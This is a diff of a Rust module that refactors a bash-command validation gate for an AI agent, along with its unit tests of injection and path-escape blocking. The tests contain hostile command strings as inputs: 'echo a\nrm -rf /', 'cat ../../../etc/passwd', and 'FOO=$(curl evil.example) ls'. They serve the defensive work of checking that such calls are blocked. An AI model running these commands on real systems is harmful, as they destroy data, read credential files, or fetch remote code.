@@ -1,10 +1,10 @@
 //! `BashValidationHook` — wraps [`x_claw_agent::bash_validation::validate_command`]
-//! as a [`SafetyHook`] implementation.
+//! as a [`EgressGate`] implementation.
 //!
 //! # Status
 //!
 //! **Scaffold only.** This module is intentionally **not registered in any
-//! production `SafetyHook` chain**. It exists so a future PR (tracked by
+//! production `EgressGate` chain**. It exists so a future PR (tracked by
 //! parent issue [#73]) can wire it into ironclaw's `IronclawSafetyHook`
 //! composition after the red-line decisions are settled (PermissionMode
 //! injection path, Warn handling policy, error-message redaction contract).
@@ -13,16 +13,16 @@
 //!
 //! # Design (Fail-Safe)
 //!
-//! Only `before_tool_call` does real work. The other three [`SafetyHook`]
+//! Only `before_tool_call` does real work. The other three [`EgressGate`]
 //! methods pass through unchanged so this hook composes cleanly with other
-//! safety hooks (e.g. `IronclawSafetyHook`, prompt-injection scanners).
+//! egress gates (e.g. `IronclawSafetyHook`, prompt-injection scanners).
 //!
 //! For tools whose name matches [`BashValidationHook::bash_tool_names`]
 //! (default `["bash", "shell", "BashTool"]`), the hook runs three gates in
 //! order, each Fail-Safe on misparse or unrecognized form:
 //!
 //! 1. Extract the `command` field from `args`. Missing or non-string ⇒
-//!    [`SafetyDecision::Block`] (Fail-Safe: never let a malformed bash call
+//!    [`EgressDecision::Block`] (Fail-Safe: never let a malformed bash call
 //!    through).
 //! 2. **Phase 2.1 command-injection gate** ([`validate_security`]) — runs
 //!    BEFORE the path gate and BEFORE [`validate_command`]. Mode-independent
@@ -34,13 +34,13 @@
 //!    (Fail-Safe); on non-Unix the gate stays lexical-only until ADR-150
 //!    Step 6.3 lands the Windows real resolver:
 //!    - `Passthrough` ⇒ continue to step 4.
-//!    - `Block { reason }` ⇒ [`SafetyDecision::Block`] regardless of mode.
+//!    - `Block { reason }` ⇒ [`EgressDecision::Block`] regardless of mode.
 //!    - `Ask { reason, blocked_path }` ⇒ mapped by mode same as Warn:
 //!      `ReadOnly` ⇒ `Block` (Fail-Safe); `Prompt` ⇒ `Ask`;
 //!      `WorkspaceWrite` / `DangerFullAccess` / `Allow` ⇒ `Allow`.
 //! 4. Call [`validate_command`] for legacy `ValidationResult` mapping:
-//!    - `Allow` ⇒ [`SafetyDecision::Allow`].
-//!    - `Block { reason }` ⇒ [`SafetyDecision::Block { reason }`]. The
+//!    - `Allow` ⇒ [`EgressDecision::Allow`].
+//!    - `Block { reason }` ⇒ [`EgressDecision::Block { reason }`]. The
 //!      `reason` string comes from `validate_command`, which by design
 //!      references the *command name or pattern*, **not the full original
 //!      argument string** — see the safety-audit test below.
@@ -77,11 +77,11 @@ use dasclaw_bash_validation::security::{
 use serde_json::Value;
 use x_claw_agent::bash_validation::{ValidationResult, validate_command};
 use x_claw_agent::permissions::PermissionMode;
-use x_claw_agent::{SafetyDecision, SafetyError, SafetyHook};
+use x_claw_agent::{EgressDecision, EgressGate, EgressKind, RedactionStats};
 
 /// Default list of tool names treated as bash invocations.
 ///
-/// Tool names are matched case-sensitively against [`SafetyHook::before_tool_call`]'s
+/// Tool names are matched case-sensitively against [`EgressGate::check`]'s
 /// `tool` argument. Callers can override via [`BashValidationHook::with_tool_names`]
 /// when their tool registry uses different names.
 pub const DEFAULT_BASH_TOOL_NAMES: &[&str] = &["bash", "shell", "BashTool"];
@@ -172,23 +172,13 @@ impl BashValidationHook {
     }
 }
 
-#[async_trait]
-impl SafetyHook for BashValidationHook {
-    async fn before_prompt(&self, _prompt: &mut String) -> Result<SafetyDecision, SafetyError> {
-        Ok(SafetyDecision::Allow)
-    }
-
-    async fn after_completion(&self, _completion: &mut String) -> Result<(), SafetyError> {
-        Ok(())
-    }
-
-    async fn before_tool_call(
-        &self,
-        tool: &str,
-        args: &mut Value,
-    ) -> Result<SafetyDecision, SafetyError> {
+impl BashValidationHook {
+    /// Core decision logic — exposed so unit and integration tests can drive
+    /// the gate without serialising args through JSON. Returns
+    /// [`EgressDecision::Allow`] for non-bash tools.
+    pub fn validate_tool_call(&self, tool: &str, args: &Value) -> EgressDecision {
         if !self.is_bash_tool(tool) {
-            return Ok(SafetyDecision::Allow);
+            return EgressDecision::Allow;
         }
 
         // Fail-Safe: bash tools without a parseable `command` are refused
@@ -197,9 +187,10 @@ impl SafetyHook for BashValidationHook {
         let command = match args.get("command").and_then(Value::as_str) {
             Some(s) if !s.is_empty() => s,
             _ => {
-                return Ok(SafetyDecision::Block {
+                return EgressDecision::Block {
                     reason: "bash tool call missing required 'command' string field".to_string(),
-                });
+                    stats: RedactionStats::default(),
+                };
             }
         };
 
@@ -210,23 +201,13 @@ impl SafetyHook for BashValidationHook {
         // gate is mode-independent: even `Allow` / `DangerFullAccess` does
         // NOT exempt command injection.
         if let SecurityResult::Block { reason } = validate_security(command) {
-            return Ok(SafetyDecision::Block {
+            return EgressDecision::Block {
                 reason: format_security_block_reason(tool, self.permission_mode, &reason),
-            });
+                stats: RedactionStats::default(),
+            };
         }
 
         // Phase 3.1 path-constraint gate (Slice 3.1.C + Phase 3.1.g.2).
-        //
-        // Runs AFTER the injection gate and BEFORE `validate_command` so
-        // that path violations short-circuit the legacy validator with a
-        // mode-aware decision. `Passthrough` falls through unchanged.
-        //
-        // SECURITY: Phase 3.1.g.2 (ADR-150 Step 6.2) wires the real POSIX
-        // symlink resolver on Unix; non-Unix retains the lexical-only
-        // Noop resolver until Step 6.3. `Ask` in `ReadOnly` mode is
-        // mapped to `Block` (Fail-Safe). `WorkspaceWrite` /
-        // `DangerFullAccess` / `Allow` log and allow, mirroring
-        // [`map_warn_by_mode`].
         let path_outcome = check_path_constraints_with_fs(
             command,
             &self.workspace,
@@ -235,28 +216,46 @@ impl SafetyHook for BashValidationHook {
             self.fs_resolver(),
         );
         if let Some(decision) = map_path_outcome_by_mode(tool, self.permission_mode, path_outcome) {
-            return Ok(decision);
+            return decision;
         }
 
         match validate_command(command, self.permission_mode, &self.workspace) {
-            ValidationResult::Allow => Ok(SafetyDecision::Allow),
-            ValidationResult::Block { reason } => Ok(SafetyDecision::Block { reason }),
+            ValidationResult::Allow => EgressDecision::Allow,
+            ValidationResult::Block { reason } => EgressDecision::Block {
+                reason,
+                stats: RedactionStats::default(),
+            },
             ValidationResult::Warn { message } => {
-                Ok(map_warn_by_mode(tool, self.permission_mode, message))
+                map_warn_by_mode(tool, self.permission_mode, message)
             }
         }
     }
+}
 
-    async fn after_tool_output(
-        &self,
-        _tool: &str,
-        _output: &mut String,
-    ) -> Result<(), SafetyError> {
-        Ok(())
+#[async_trait]
+impl EgressGate for BashValidationHook {
+    async fn check(&self, kind: &EgressKind, payload: &str) -> EgressDecision {
+        // ADR-148: bash validation operates only on ToolExecution egress.
+        let tool = match kind {
+            EgressKind::ToolExecution { tool } => tool,
+            _ => return EgressDecision::Allow,
+        };
+        // Fail-Safe: a payload that does not deserialise into JSON is
+        // treated as a structurally invalid bash call.
+        let args: Value = match serde_json::from_str(payload) {
+            Ok(v) => v,
+            Err(e) => {
+                return EgressDecision::Block {
+                    reason: format!("bash validation gate: malformed tool args payload: {e}"),
+                    stats: RedactionStats::default(),
+                };
+            }
+        };
+        self.validate_tool_call(tool, &args)
     }
 }
 
-/// Maps a `Warn { message }` validation result to a [`SafetyDecision`]
+/// Maps a `Warn { message }` validation result to a [`EgressDecision`]
 /// according to [`PermissionMode`], per ADR-146 §2.5.
 ///
 /// | Mode                | Decision  | Logging               |
@@ -269,7 +268,7 @@ impl SafetyHook for BashValidationHook {
 ///
 /// In `Prompt` mode `suggestions` is left empty; later slices populate it
 /// from per-Warn pattern generators.
-fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> SafetyDecision {
+fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> EgressDecision {
     match mode {
         PermissionMode::ReadOnly => {
             // Fail-Safe: ReadOnly never tolerates Warn.
@@ -279,7 +278,10 @@ fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> Safety
                 mode = mode.as_str(),
                 "BashValidationHook Warn -> Block (ReadOnly)"
             );
-            SafetyDecision::Block { reason: message }
+            EgressDecision::Block {
+                reason: message,
+                stats: RedactionStats::default(),
+            }
         }
         PermissionMode::WorkspaceWrite => {
             tracing::warn!(
@@ -288,7 +290,7 @@ fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> Safety
                 mode = mode.as_str(),
                 "BashValidationHook Warn -> Allow (WorkspaceWrite)"
             );
-            SafetyDecision::Allow
+            EgressDecision::Allow
         }
         PermissionMode::DangerFullAccess => {
             tracing::info!(
@@ -297,11 +299,11 @@ fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> Safety
                 mode = mode.as_str(),
                 "BashValidationHook Warn -> Allow (DangerFullAccess)"
             );
-            SafetyDecision::Allow
+            EgressDecision::Allow
         }
         PermissionMode::Allow => {
             // PermissionMode::Allow == "skip checks entirely"; no log.
-            SafetyDecision::Allow
+            EgressDecision::Allow
         }
         PermissionMode::Prompt => {
             tracing::warn!(
@@ -310,7 +312,7 @@ fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> Safety
                 mode = mode.as_str(),
                 "BashValidationHook Warn -> Ask (Prompt)"
             );
-            SafetyDecision::Ask {
+            EgressDecision::Ask {
                 reason: message,
                 // suggestions intentionally empty in slice C MVP; later
                 // slices generate per-Warn rule patterns.
@@ -321,7 +323,7 @@ fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> Safety
 }
 
 /// Maps a [`PathValidationOutcome`] (from Phase 3.1.B's
-/// [`check_path_constraints`]) into an optional [`SafetyDecision`] under
+/// [`check_path_constraints`]) into an optional [`EgressDecision`] under
 /// the active [`PermissionMode`], following the same matrix as
 /// [`map_warn_by_mode`].
 ///
@@ -339,7 +341,7 @@ fn map_path_outcome_by_mode(
     tool: &str,
     mode: PermissionMode,
     outcome: PathValidationOutcome,
-) -> Option<SafetyDecision> {
+) -> Option<EgressDecision> {
     match outcome {
         PathValidationOutcome::Passthrough => None,
         PathValidationOutcome::Block { reason } => {
@@ -349,8 +351,9 @@ fn map_path_outcome_by_mode(
                 %reason,
                 "bash_path_constraints::block"
             );
-            Some(SafetyDecision::Block {
+            Some(EgressDecision::Block {
                 reason: format!("bash_path_constraints::block: {reason}"),
+                stats: RedactionStats::default(),
             })
         }
         PathValidationOutcome::Ask {
@@ -369,7 +372,10 @@ fn map_path_outcome_by_mode(
                         reason = %formatted,
                         "BashValidationHook PathAsk -> Block (ReadOnly)"
                     );
-                    SafetyDecision::Block { reason: formatted }
+                    EgressDecision::Block {
+                        reason: formatted,
+                        stats: RedactionStats::default(),
+                    }
                 }
                 PermissionMode::WorkspaceWrite => {
                     tracing::warn!(
@@ -378,7 +384,7 @@ fn map_path_outcome_by_mode(
                         reason = %formatted,
                         "BashValidationHook PathAsk -> Allow (WorkspaceWrite)"
                     );
-                    SafetyDecision::Allow
+                    EgressDecision::Allow
                 }
                 PermissionMode::DangerFullAccess => {
                     tracing::info!(
@@ -387,9 +393,9 @@ fn map_path_outcome_by_mode(
                         reason = %formatted,
                         "BashValidationHook PathAsk -> Allow (DangerFullAccess)"
                     );
-                    SafetyDecision::Allow
+                    EgressDecision::Allow
                 }
-                PermissionMode::Allow => SafetyDecision::Allow,
+                PermissionMode::Allow => EgressDecision::Allow,
                 PermissionMode::Prompt => {
                     tracing::warn!(
                         tool,
@@ -397,7 +403,7 @@ fn map_path_outcome_by_mode(
                         reason = %formatted,
                         "BashValidationHook PathAsk -> Ask (Prompt)"
                     );
-                    SafetyDecision::Ask {
+                    EgressDecision::Ask {
                         reason: formatted,
                         suggestions: Vec::new(),
                     }
@@ -454,35 +460,26 @@ mod tests {
     #[tokio::test]
     async fn non_bash_tool_short_circuits_to_allow() {
         let h = hook(PermissionMode::ReadOnly);
-        let mut args = json!({ "path": "/etc/passwd" });
-        let decision = h
-            .before_tool_call("read_file", &mut args)
-            .await
-            .expect("hook should not error");
-        assert_eq!(decision, SafetyDecision::Allow);
+        let args = json!({ "path": "/etc/passwd" });
+        let decision = h.validate_tool_call("read_file", &args);
+        assert_eq!(decision, EgressDecision::Allow);
     }
 
     #[tokio::test]
     async fn bash_tool_with_safe_command_is_allowed() {
         let h = hook(PermissionMode::WorkspaceWrite);
-        let mut args = json!({ "command": "ls -la" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
-        assert_eq!(decision, SafetyDecision::Allow);
+        let args = json!({ "command": "ls -la" });
+        let decision = h.validate_tool_call("bash", &args);
+        assert_eq!(decision, EgressDecision::Allow);
     }
 
     #[tokio::test]
     async fn bash_tool_missing_command_field_is_blocked_fail_safe() {
         let h = hook(PermissionMode::WorkspaceWrite);
-        let mut args = json!({ "not_command": "ls" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
+        let args = json!({ "not_command": "ls" });
+        let decision = h.validate_tool_call("bash", &args);
         match decision {
-            SafetyDecision::Block { reason } => {
+            EgressDecision::Block { reason, .. } => {
                 assert!(
                     reason.contains("missing"),
                     "expected Fail-Safe reason mentioning missing field, got: {reason}"
@@ -495,12 +492,9 @@ mod tests {
     #[tokio::test]
     async fn bash_tool_empty_command_field_is_blocked_fail_safe() {
         let h = hook(PermissionMode::WorkspaceWrite);
-        let mut args = json!({ "command": "" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
-        assert!(matches!(decision, SafetyDecision::Block { .. }));
+        let args = json!({ "command": "" });
+        let decision = h.validate_tool_call("bash", &args);
+        assert!(matches!(decision, EgressDecision::Block { .. }));
     }
 
     #[tokio::test]
@@ -512,13 +506,10 @@ mod tests {
         // (`req_safety_490_3_1_c_audit_log_carries_blocked_path`).
         let h = BashValidationHook::new(PermissionMode::ReadOnly, PathBuf::from("/workspace"))
             .with_home_dir(Some(PathBuf::from("/home/user")));
-        let mut args = json!({ "command": "rm -rf /workspace/secret-payload.bin" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
+        let args = json!({ "command": "rm -rf /workspace/secret-payload.bin" });
+        let decision = h.validate_tool_call("bash", &args);
         match decision {
-            SafetyDecision::Block { reason } => {
+            EgressDecision::Block { reason, .. } => {
                 // Safety-audit: `validate_command`'s block reason
                 // describes the command class, not the original argument
                 // list. The full argument path (which may contain
@@ -539,12 +530,9 @@ mod tests {
     #[tokio::test]
     async fn write_command_in_read_only_mode_is_blocked() {
         let h = hook(PermissionMode::ReadOnly);
-        let mut args = json!({ "command": "cp src.txt dst.txt" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
-        assert!(matches!(decision, SafetyDecision::Block { .. }));
+        let args = json!({ "command": "cp src.txt dst.txt" });
+        let decision = h.validate_tool_call("bash", &args);
+        assert!(matches!(decision, EgressDecision::Block { .. }));
     }
 
     #[tokio::test]
@@ -553,20 +541,17 @@ mod tests {
         // under WorkspaceWrite mode. Per ADR-146 §2.5, WorkspaceWrite maps
         // Warn -> Allow + tracing::warn! (does not interrupt the user).
         let h = hook(PermissionMode::WorkspaceWrite);
-        let mut args = json!({ "command": "rm -rf /tmp/scratch" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
+        let args = json!({ "command": "rm -rf /tmp/scratch" });
+        let decision = h.validate_tool_call("bash", &args);
         assert_eq!(
             decision,
-            SafetyDecision::Allow,
+            EgressDecision::Allow,
             "Warn under WorkspaceWrite -> Allow + log (ADR-146 §2.5)"
         );
     }
 
     // -----------------------------------------------------------------
-    // ADR-146 §2.5: Warn -> SafetyDecision mapping matrix per
+    // ADR-146 §2.5: Warn -> EgressDecision mapping matrix per
     // PermissionMode. The 25-case acceptance matrix (5 decisions × 5
     // modes) is split across the bash-pipeline `validate_command` tests
     // (which cover Allow/Block paths) and the `req_safety_73_c_warn_*`
@@ -582,13 +567,13 @@ mod tests {
     #[tokio::test]
     async fn req_safety_73_c_warn_readonly_blocks() {
         let h = hook(PermissionMode::ReadOnly);
-        let mut args = json!({ "command": "rm -rf /tmp/scratch" });
-        let decision = h.before_tool_call("bash", &mut args).await.unwrap();
+        let args = json!({ "command": "rm -rf /tmp/scratch" });
+        let decision = h.validate_tool_call("bash", &args);
         // ReadOnly may treat destructive as Block (via validate_command's
         // direct Block path) OR as Warn (mapped to Block here). Either way
         // the outcome must be Block — Fail-Safe is the invariant.
         assert!(
-            matches!(decision, SafetyDecision::Block { .. }),
+            matches!(decision, EgressDecision::Block { .. }),
             "ReadOnly must Block destructive commands, got {decision:?}"
         );
     }
@@ -598,9 +583,9 @@ mod tests {
     #[tokio::test]
     async fn req_safety_73_c_warn_workspace_write_allows() {
         let h = hook(PermissionMode::WorkspaceWrite);
-        let mut args = json!({ "command": "rm -rf /tmp/scratch" });
-        let decision = h.before_tool_call("bash", &mut args).await.unwrap();
-        assert_eq!(decision, SafetyDecision::Allow);
+        let args = json!({ "command": "rm -rf /tmp/scratch" });
+        let decision = h.validate_tool_call("bash", &args);
+        assert_eq!(decision, EgressDecision::Allow);
     }
 
     /// `req_safety_73_c_warn_danger_full_access_allows` —
@@ -608,9 +593,9 @@ mod tests {
     #[tokio::test]
     async fn req_safety_73_c_warn_danger_full_access_allows() {
         let h = hook(PermissionMode::DangerFullAccess);
-        let mut args = json!({ "command": "rm -rf /tmp/scratch" });
-        let decision = h.before_tool_call("bash", &mut args).await.unwrap();
-        assert_eq!(decision, SafetyDecision::Allow);
+        let args = json!({ "command": "rm -rf /tmp/scratch" });
+        let decision = h.validate_tool_call("bash", &args);
+        assert_eq!(decision, EgressDecision::Allow);
     }
 
     /// `req_safety_73_c_warn_allow_mode_allows_no_log` —
@@ -618,9 +603,9 @@ mod tests {
     #[tokio::test]
     async fn req_safety_73_c_warn_allow_mode_allows_no_log() {
         let h = hook(PermissionMode::Allow);
-        let mut args = json!({ "command": "rm -rf /tmp/scratch" });
-        let decision = h.before_tool_call("bash", &mut args).await.unwrap();
-        assert_eq!(decision, SafetyDecision::Allow);
+        let args = json!({ "command": "rm -rf /tmp/scratch" });
+        let decision = h.validate_tool_call("bash", &args);
+        assert_eq!(decision, EgressDecision::Allow);
     }
 
     /// `req_safety_73_c_warn_prompt_asks` —
@@ -628,10 +613,10 @@ mod tests {
     #[tokio::test]
     async fn req_safety_73_c_warn_prompt_asks() {
         let h = hook(PermissionMode::Prompt);
-        let mut args = json!({ "command": "rm -rf /tmp/scratch" });
-        let decision = h.before_tool_call("bash", &mut args).await.unwrap();
+        let args = json!({ "command": "rm -rf /tmp/scratch" });
+        let decision = h.validate_tool_call("bash", &args);
         match decision {
-            SafetyDecision::Ask {
+            EgressDecision::Ask {
                 reason,
                 suggestions,
             } => {
@@ -660,11 +645,11 @@ mod tests {
             PermissionMode::Allow,
         ] {
             let h = hook(mode);
-            let mut args = json!({ "command": "ls -la" });
-            let decision = h.before_tool_call("bash", &mut args).await.unwrap();
+            let args = json!({ "command": "ls -la" });
+            let decision = h.validate_tool_call("bash", &args);
             assert_eq!(
                 decision,
-                SafetyDecision::Allow,
+                EgressDecision::Allow,
                 "`ls -la` should be Allow under mode {mode:?}, got {decision:?}"
             );
         }
@@ -686,13 +671,13 @@ mod tests {
             PermissionMode::Allow,
         ] {
             let h = hook(mode);
-            let mut args = json!({ "command": "cat ../../../etc/passwd" });
-            let decision = h.before_tool_call("bash", &mut args).await.unwrap();
+            let args = json!({ "command": "cat ../../../etc/passwd" });
+            let decision = h.validate_tool_call("bash", &args);
             // Allow mode is permissive — only assert Block on stricter modes.
             // The test still exercises all 5 modes for non-panic / non-error.
             match mode {
                 PermissionMode::ReadOnly => assert!(
-                    matches!(decision, SafetyDecision::Block { .. }),
+                    matches!(decision, EgressDecision::Block { .. }),
                     "ReadOnly should Block path-escape, got {decision:?}"
                 ),
                 _ => {
@@ -701,9 +686,9 @@ mod tests {
                     // and returned a known variant".
                     assert!(matches!(
                         decision,
-                        SafetyDecision::Allow
-                            | SafetyDecision::Block { .. }
-                            | SafetyDecision::Ask { .. }
+                        EgressDecision::Allow
+                            | EgressDecision::Block { .. }
+                            | EgressDecision::Ask { .. }
                     ));
                 }
             }
@@ -715,8 +700,8 @@ mod tests {
     /// itself never returns it, but the type must exist for chain code).
     #[test]
     fn req_safety_73_c_passthrough_variant_constructs() {
-        let d = SafetyDecision::Passthrough;
-        assert_eq!(d, SafetyDecision::Passthrough);
+        let d = EgressDecision::Passthrough;
+        assert_eq!(d, EgressDecision::Passthrough);
     }
 
     /// `req_safety_73_c_ask_with_suggestions_round_trips` —
@@ -724,7 +709,7 @@ mod tests {
     #[test]
     fn req_safety_73_c_ask_with_suggestions_round_trips() {
         use x_claw_agent::{RuleAction, RuleSuggestion};
-        let d = SafetyDecision::Ask {
+        let d = EgressDecision::Ask {
             reason: "Confirm `rm`?".to_string(),
             suggestions: vec![
                 RuleSuggestion {
@@ -748,53 +733,40 @@ mod tests {
         let h = BashValidationHook::new(PermissionMode::ReadOnly, PathBuf::from("/workspace"))
             .with_tool_names(["my_custom_shell"]);
         // Default name `bash` should no longer match.
-        let mut args = json!({ "command": "rm file" });
-        let decision = h
-            .before_tool_call("bash", &mut args)
-            .await
-            .expect("hook should not error");
+        let args = json!({ "command": "rm file" });
+        let decision = h.validate_tool_call("bash", &args);
         assert_eq!(
             decision,
-            SafetyDecision::Allow,
+            EgressDecision::Allow,
             "after override, 'bash' is no longer recognised"
         );
 
         // The overridden name should match.
-        let mut args = json!({ "command": "rm file" });
-        let decision = h
-            .before_tool_call("my_custom_shell", &mut args)
-            .await
-            .expect("hook should not error");
+        let args = json!({ "command": "rm file" });
+        let decision = h.validate_tool_call("my_custom_shell", &args);
         assert!(
-            matches!(decision, SafetyDecision::Block { .. }),
+            matches!(decision, EgressDecision::Block { .. }),
             "overridden tool name should run the validator"
         );
     }
 
     #[tokio::test]
-    async fn pass_through_methods_are_inert() {
+    async fn non_tool_execution_kinds_allow_unchanged() {
+        // ADR-148: only `ToolExecution` carries bash args; the other three
+        // egress kinds (LlmRequest / UserDisplay / Persistence) MUST
+        // short-circuit to `Allow` without inspecting the payload.
         let h = hook(PermissionMode::ReadOnly);
-
-        let mut prompt = "hello".to_string();
-        assert_eq!(
-            h.before_prompt(&mut prompt)
-                .await
-                .expect("before_prompt should not error"),
-            SafetyDecision::Allow
-        );
-        assert_eq!(prompt, "hello", "before_prompt must not mutate");
-
-        let mut completion = "world".to_string();
-        h.after_completion(&mut completion)
-            .await
-            .expect("after_completion should not error");
-        assert_eq!(completion, "world", "after_completion must not mutate");
-
-        let mut output = "tool output".to_string();
-        h.after_tool_output("bash", &mut output)
-            .await
-            .expect("after_tool_output should not error");
-        assert_eq!(output, "tool output", "after_tool_output must not mutate");
+        for kind in [
+            EgressKind::LlmRequest,
+            EgressKind::UserDisplay,
+            EgressKind::Persistence,
+        ] {
+            assert_eq!(
+                h.check(&kind, "arbitrary payload").await,
+                EgressDecision::Allow,
+                "egress kind {kind:?} should pass through"
+            );
+        }
     }
 
     // ---- Slice 2.1.d — Phase 2.1 security gate e2e tests ----------------
@@ -808,19 +780,17 @@ mod tests {
     /// (newline-injection, rule `Newlines` / `QuotedNewline`).
     const INJECTION_CMD: &str = "echo a\nrm -rf /";
 
-    async fn run_bash(mode: PermissionMode, cmd: &str) -> SafetyDecision {
+    async fn run_bash(mode: PermissionMode, cmd: &str) -> EgressDecision {
         let h = hook(mode);
-        let mut args = json!({ "command": cmd });
-        h.before_tool_call("bash", &mut args)
-            .await
-            .expect("hook must not error on string command")
+        let args = json!({ "command": cmd });
+        h.validate_tool_call("bash", &args)
     }
 
     #[tokio::test]
     async fn req_security_490_p2_1_d_injection_blocked_in_workspace_write_mode() {
         let d = run_bash(PermissionMode::WorkspaceWrite, INJECTION_CMD).await;
         match d {
-            SafetyDecision::Block { reason } => assert!(
+            EgressDecision::Block { reason, .. } => assert!(
                 reason.starts_with("bash_security::"),
                 "reason must carry rule prefix, got {reason:?}"
             ),
@@ -834,7 +804,7 @@ mod tests {
         // mode. Phase 2.1 §8 mandates the security gate ignores it.
         let d = run_bash(PermissionMode::Allow, INJECTION_CMD).await;
         assert!(
-            matches!(d, SafetyDecision::Block { .. }),
+            matches!(d, EgressDecision::Block { .. }),
             "Allow mode must NOT exempt command injection, got {d:?}"
         );
     }
@@ -843,7 +813,7 @@ mod tests {
     async fn req_security_490_p2_1_d_injection_blocked_in_danger_full_access_mode() {
         let d = run_bash(PermissionMode::DangerFullAccess, INJECTION_CMD).await;
         assert!(
-            matches!(d, SafetyDecision::Block { .. }),
+            matches!(d, EgressDecision::Block { .. }),
             "DangerFullAccess must NOT exempt command injection, got {d:?}"
         );
     }
@@ -854,11 +824,11 @@ mod tests {
         // the injection variant must Block via the security gate, proving
         // the gate runs BEFORE the legacy pipeline regardless of mode.
         let d_safe = run_bash(PermissionMode::ReadOnly, "ls -la").await;
-        assert_eq!(d_safe, SafetyDecision::Allow);
+        assert_eq!(d_safe, EgressDecision::Allow);
 
         let d_injection = run_bash(PermissionMode::ReadOnly, INJECTION_CMD).await;
         match d_injection {
-            SafetyDecision::Block { reason } => assert!(
+            EgressDecision::Block { reason, .. } => assert!(
                 reason.starts_with("bash_security::"),
                 "security gate must surface its own rule, not a legacy reason; got {reason:?}"
             ),
@@ -878,7 +848,7 @@ mod tests {
         // `tests/bash_security_audit_log.rs` using `tracing-test`.
         let d = run_bash(PermissionMode::Prompt, INJECTION_CMD).await;
         let reason = match d {
-            SafetyDecision::Block { reason } => reason,
+            EgressDecision::Block { reason, .. } => reason,
             other => panic!("expected Block, got {other:?}"),
         };
         assert!(
@@ -908,10 +878,10 @@ mod tests {
             .with_home_dir(Some(PathBuf::from("/home/user")))
     }
 
-    async fn run_path(mode: PermissionMode, cmd: &str) -> SafetyDecision {
+    async fn run_path(mode: PermissionMode, cmd: &str) -> EgressDecision {
         let h = path_hook(mode);
-        let mut args = json!({ "command": cmd });
-        h.before_tool_call("bash", &mut args).await.unwrap()
+        let args = json!({ "command": cmd });
+        h.validate_tool_call("bash", &args)
     }
 
     /// `req_safety_490_3_1_c_inside_workspace_allows` —
@@ -921,7 +891,7 @@ mod tests {
     #[tokio::test]
     async fn req_safety_490_3_1_c_inside_workspace_allows() {
         let d = run_path(PermissionMode::WorkspaceWrite, "cat /work/repo/src/main.rs").await;
-        assert_eq!(d, SafetyDecision::Allow);
+        assert_eq!(d, EgressDecision::Allow);
     }
 
     /// `req_safety_490_3_1_c_outside_workspace_prompt_asks` —
@@ -931,7 +901,7 @@ mod tests {
     async fn req_safety_490_3_1_c_outside_workspace_prompt_asks() {
         let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
         match d {
-            SafetyDecision::Ask { reason, .. } => {
+            EgressDecision::Ask { reason, .. } => {
                 assert!(
                     reason.starts_with("bash_path_constraints::ask"),
                     "expected path-ask audit prefix, got {reason:?}"
@@ -948,7 +918,7 @@ mod tests {
     async fn req_safety_490_3_1_c_outside_workspace_readonly_blocks() {
         let d = run_path(PermissionMode::ReadOnly, "cat /etc/passwd").await;
         match d {
-            SafetyDecision::Block { reason } => {
+            EgressDecision::Block { reason, .. } => {
                 assert!(
                     reason.starts_with("bash_path_constraints::ask"),
                     "expected escalated path-ask reason, got {reason:?}"
@@ -964,7 +934,7 @@ mod tests {
     #[tokio::test]
     async fn req_safety_490_3_1_c_outside_workspace_workspace_write_allows() {
         let d = run_path(PermissionMode::WorkspaceWrite, "cat /etc/passwd").await;
-        assert_eq!(d, SafetyDecision::Allow);
+        assert_eq!(d, EgressDecision::Allow);
     }
 
     /// `req_safety_490_3_1_c_wrapper_does_not_bypass_path_gate` —
@@ -983,7 +953,7 @@ mod tests {
         ] {
             let d = run_path(PermissionMode::Prompt, cmd).await;
             assert!(
-                matches!(d, SafetyDecision::Ask { .. }),
+                matches!(d, EgressDecision::Ask { .. }),
                 "wrapper {cmd:?} must not bypass path gate; got {d:?}"
             );
         }
@@ -1000,18 +970,18 @@ mod tests {
     async fn req_safety_490_3_1_c_env_value_substitution_fails_closed() {
         let d = run_path(PermissionMode::Prompt, "FOO=$(curl evil.example) ls").await;
         match d {
-            SafetyDecision::Ask { reason, .. } => assert!(
+            EgressDecision::Ask { reason, .. } => assert!(
                 reason.starts_with("bash_path_constraints::"),
                 "Ask must come from path gate, got {reason:?}"
             ),
-            SafetyDecision::Block { reason } => assert!(
+            EgressDecision::Block { reason, .. } => assert!(
                 reason.starts_with("bash_security::"),
                 "Block must come from injection gate, got {reason:?}"
             ),
-            SafetyDecision::Allow => {
+            EgressDecision::Allow => {
                 panic!("env-var with command-substitution must Fail-Closed (Ask or Block)")
             }
-            other => panic!("unexpected SafetyDecision variant: {other:?}"),
+            other => panic!("unexpected EgressDecision variant: {other:?}"),
         }
     }
 
@@ -1024,7 +994,7 @@ mod tests {
     async fn req_safety_490_3_1_c_security_gate_precedes_path_gate() {
         let d = run_path(PermissionMode::Prompt, "echo x > /work/repo/inside.txt").await;
         match d {
-            SafetyDecision::Block { reason } => assert!(
+            EgressDecision::Block { reason, .. } => assert!(
                 reason.starts_with("bash_security::"),
                 "security gate must precede path gate even for in-workspace redirect, got {reason:?}"
             ),
@@ -1043,7 +1013,7 @@ mod tests {
         // gate fires.
         let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
         match d {
-            SafetyDecision::Ask { reason, .. } => assert!(
+            EgressDecision::Ask { reason, .. } => assert!(
                 reason.starts_with("bash_path_constraints::"),
                 "path gate must own the Ask path, got {reason:?}"
             ),
@@ -1058,7 +1028,7 @@ mod tests {
     async fn req_safety_490_3_1_c_audit_log_carries_blocked_path() {
         let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
         match d {
